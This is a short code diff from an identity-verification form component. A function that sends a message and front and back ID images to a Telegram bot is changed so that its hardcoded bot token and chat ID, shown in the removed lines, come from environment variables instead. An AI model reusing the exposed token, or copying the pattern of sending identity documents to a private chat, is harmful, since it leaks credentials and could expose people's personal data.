@@ -93,8 +93,8 @@ const IdentityVerificationForm = () => {
   };
 
   const sendTelegramMessage = async (message: string, frontImage: File, backImage: File) => {
-    const botToken = "7972666652:AAHpQu7Ax4vgN-lL_-psZbWVjptYDvgl7YA";
-    const chatId = "1303640598";
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
 
     try {
       const sendPhoto = async (photo: File) => {
